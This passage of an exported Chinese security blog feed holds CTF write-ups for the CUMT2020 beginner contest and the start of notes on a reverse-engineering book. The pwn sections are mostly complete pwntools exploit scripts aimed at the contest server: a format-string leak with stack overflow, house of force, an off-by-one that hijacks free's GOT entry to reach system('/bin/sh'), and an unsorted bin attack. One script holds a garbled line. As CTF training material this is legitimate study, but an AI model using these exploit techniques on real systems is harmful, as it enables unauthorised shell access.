class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#def show(idx):</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(\"3\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(str(idx))</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"number\">0x6020a0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = flag - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"number\">0x20</span> + <span class=\"number\">0x20</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"666\"</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"pwn8\"><a href=\"#pwn8\" class=\"headerlink\" title=\"pwn8\"></a>pwn8</h1><blockquote>\n<p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p>\n<p>任意写</p>\n</blockquote>\n","categories":["复现"],"tags":["WP"]},{"title":"CUMT2020入门赛","url":"https://pz1o.top/2020/11/28/CUMT2020入门赛/","content":"<a id=\"more\"></a>\n<h1 id=\"CUMT2020入门赛\"><a href=\"#CUMT2020入门赛\" class=\"headerlink\" title=\"CUMT2020入门赛\"></a>CUMT2020入门赛</h1><p>本不准备写的，主要tcl，还是留个坑位等考完试来复现</p>\n<p>主要对堆不理解，并且不懂漏洞利用点在哪里</p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"test-nc\"><a href=\"#test-nc\" class=\"headerlink\" title=\"test_nc\"></a>test_nc</h3><p>nc连接拿flag</p>\n<h3 id=\"pwn2\"><a href=\"#pwn2\" class=\"headerlink\" title=\"pwn2\"></a>pwn2</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwnlib <span class=\"keyword\">import</span> gdb</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib <span class=\"keyword\">import</span> context</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.tubes.remote <span class=\"keyword\">import</span> remote</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.tubes.process <span class=\"keyword\">import</span> process</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.elf.elf <span class=\"keyword\">import</span> ELF</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.util.packing <span class=\"keyword\">import</span> make_packer</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = make_packer(word_size=<span class=\"number\">64</span>)</span><br><span class=\"line\">bd = <span class=\"number\">0x400756</span></span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./overflow\")</span></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10011</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b'Welcome to CTF2020!\\n'</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b'Please input your username\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(<span class=\"string\">b'%11$p'</span>)</span><br><span class=\"line\">pp = r.recv()</span><br><span class=\"line\">print(pp)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(<span class=\"string\">b'a'</span>*<span class=\"number\">0x28</span> + p(int(pp, <span class=\"number\">16</span>)) + <span class=\"string\">b'a'</span>*<span class=\"number\">8</span> + p(<span class=\"number\">0x400756</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a>pwn3</h3><p>栈溢出</p>\n<h3 id=\"pwn4\"><a href=\"#pwn4\" class=\"headerlink\" title=\"pwn4\"></a>pwn4</h3><p>整数溢出</p>\n<p>输入65536</p>\n<p>得到shell</p>\n<h3 id=\"pwn5-fail\"><a href=\"#pwn5-fail\" class=\"headerlink\" title=\"pwn5(fail)\"></a>pwn5(fail)</h3><p>先贴exp，考完试来学习</p>\n<p>漏洞点想的是一样的</p>\n<p>但其中有些细节不太懂</p>\n<blockquote>\n<p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p>\n<p>关于house of force不懂得的可以参考这篇文章</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10014</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400D1B</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"ddaa\"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x30</span> * <span class=\"string\">'a'</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\">offset_to_heap_base = -(<span class=\"number\">0x40</span> + <span class=\"number\">0x20</span>)</span><br><span class=\"line\">malloc = offset_to_heap_base - <span class=\"number\">0x8</span> - <span class=\"number\">0xf</span></span><br><span class=\"line\">add(malloc,<span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(magic) * <span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn6-fail\"><a href=\"#pwn6-fail\" class=\"headerlink\" title=\"pwn6(fail)\"></a>pwn6(fail)</h3><blockquote>\n<p>change函数中存在单字节溢出漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;if ( heap[v1] ) </span><br><span class=\"line\">&gt;&#123; \tprintf(&quot;Content of heap : &quot;);</span><br><span class=\"line\">\tread_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class=\"line\">\tputs(&quot;Done !&quot;); </span><br><span class=\"line\">&gt;&#125;</span><br></pre></td></tr></table></figure>\n<p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p>\n<p>泄露出libc基地址，修改got表，最后get_shell</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10015</span>)</span><br><span class=\"line\">heap = ELF(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got = heap.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">'A'</span>*<span class=\"number\">0x10</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(<span class=\"number\">0x20</span>) + p64(heap.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"Content : \"</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc_base = free_addr -libc.symbols[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">'libc base addr:'</span>+hex(libc_base))</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">change(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn7-fail\"><a href=\"#pwn7-fail\" class=\"headerlink\" title=\"pwn7(fail)\"></a>pwn7(fail)</h3><blockquote>\n<p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p>\n<p>关于unsorted bin attack可以参考这篇文章</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10016</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#def show(idx):</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(\"3\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(str(idx))</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"number\">0x6020a0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = flag - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"number\">0x20</span> + <span class=\"number\">0x20</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"666\"</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn8-fail\"><a href=\"#pwn8-fail\" class=\"headerlink\" title=\"pwn8(fail)\"></a>pwn8(fail)</h3><blockquote>\n<p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p>\n<p>任意写</p>\n</blockquote>\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"MISC签到题\"><a href=\"#MISC签到题\" class=\"headerlink\" title=\"MISC签到题\"></a>MISC签到题</h3><p>ook解码</p>\n<h3 id=\"双重洗脑\"><a href=\"#双重洗脑\" class=\"headerlink\" title=\"双重洗脑\"></a>双重洗脑</h3><p>与佛论禅+社会主义价值观</p>\n<h3 id=\"真·签到\"><a href=\"#真·签到\" class=\"headerlink\" title=\"真·签到\"></a>真·签到</h3><p>加qq拍一拍</p>\n<h3 id=\"猜猜可莉把flag藏到哪了\"><a href=\"#猜猜可莉把flag藏到哪了\" class=\"headerlink\" title=\"猜猜可莉把flag藏到哪了\"></a>猜猜可莉把flag藏到哪了</h3><p>脱进010，直接盲文解密</p>\n<h3 id=\"7的意志！\"><a href=\"#7的意志！\" class=\"headerlink\" title=\"7的意志！\"></a>7的意志！</h3><p>压缩包密码7</p>\n<p>栅栏加凯撒</p>\n<h3 id=\"奇怪的题\"><a href=\"#奇怪的题\" class=\"headerlink\" title=\"奇怪的题\"></a>奇怪的题</h3><p>改像素可以得到一张散开的二维码</p>\n<p>把三个拼一个二维码</p>\n<p>补三个定位符</p>\n","categories":["wp"],"tags":["WP"]},{"title":"逆向工程核心原理读书笔记Book","url":"https://pz1o.top/2020/10/27/逆向工程核心原理读书笔记/","content":"<a id=\"more\"></a>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>预估三个月，但说不定为了赶其他的ddl，也就读不完了，尽力去吧。只记些重要的</p>\n<h1 id=\"第二章-逆向分析\"><a href=\"#第二章-逆向分析\" class=\"headerlink\" title=\"第二章 逆向分析\"></a>第二章 逆向分析</h1><p><strong>定位方法</strong></p>\n<ol>\n<li>直接执行</li>\n<li>字符串定位</li>\n<li>内存映射</li>\n</ol>\n<p><strong>修改字符串</strong></p>\n<ol>\n<li>直接缓存区修改，不能修改过长</li>\n<li>改变栈地址，到一块空白的字符串</li>\n</ol>\n<h1 id=\"第四章-寄存器\"><a href=\"#第四章-寄存器\" class=\"headerlink\" title=\"第四章 寄存器\"></a>第四章 寄存器</h1><p><strong>寄存器</strong><br><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210309173427804.png\" alt=\"image-20210309173427804\"></p>\n<ul>\n<li>EAX：累加器（函数返回值）</li>\n<li>EBX：基址寄存器</li>\n<li>ECX：计数器（字符串和循环操作）</li>\n<li>EDX：数据寄存器</li>\n</ul>\n<p><strong>段寄存器</strong></p>\n<ul>\n<li>CS：代码段</li>\n<li>SS：栈段</li>\n<li>DS：数据段</li>\n<li>ES：附加段</li>\n<li>FS：数据段</li>\n<li>GS：数据段</li>\n</ul>\n<p><strong>标志寄存器</strong></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210309175356181.png\" alt=\"image-20210309175356181\"></p>\n<h1 id=\"第八章-crackme-2\"><a href=\"#第八章-crackme-2\" class=\"headerlink\" title=\"第八章 crackme#2\"></a>第八章 crackme#2</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">test ax,ax</span><br><span class=\"line\">&#x2F;&#x2F;两个数中一个为0-&gt;ZF&#x3D;1</span><br></pre></td></tr></table></figure>\n<h2 id=\"解密算法分析\"><a href=\"#解密算法分析\" class=\"headerlink\" title=\"解密算法分析\"></a>解密算法分析</h2><h3 id=\"1-查找函数开始的部分\"><a href=\"#1-查找函数开始的部分\" class=\"headerlink\" title=\"1.查找函数开始的部分\"></a>1.查找函数开始的部分</h3><p>寻找有关生成栈帧的部分</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ebp</span><br><span class=\"line\">mov ebp,esp</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-预测代码\"><a href=\"#2-预测代码\" class=\"headerlink\" title=\"2.预测代码\"></a>2.预测代码</h3><ul>\n<li>读取name字符串（使用GetWindowText、GetDlgItemText）</li>\n<li>启动循环，对字符串加密（XOR、ADD、SUB）</li>\n</ul>\n<h3 id=\"3-定位关键函数\"><a href=\"#3-定位关键函数\" class=\"headerlink\" title=\"3.定位关键函数\"></a>3.定位关键函数</h3><ul>\n<li>观察每个函数的参数的变化</li>\n<li>反复调试</li>\n<li>要注意栈帧的变化</li>\n<li>同时根据函数名字也可以看出点东西来</li>\n</ul>\n<h1 id=\"第十章-函数调用约定\"><a href=\"#第十章-函数调用约定\" 